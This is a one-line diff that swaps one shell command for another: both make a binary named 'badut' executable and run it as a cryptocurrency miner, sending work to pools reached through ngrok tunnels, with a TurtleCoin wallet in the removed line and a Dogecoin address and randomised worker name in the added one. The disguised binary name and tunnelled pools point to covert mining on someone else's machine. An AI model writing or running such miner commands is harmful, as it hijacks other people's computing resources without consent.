@@ -1,1 +1,1 @@
-chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11316 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k
+chmod 777 badut && ./badut -a rx/0 -o 8.tcp.ngrok.io:10498 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x
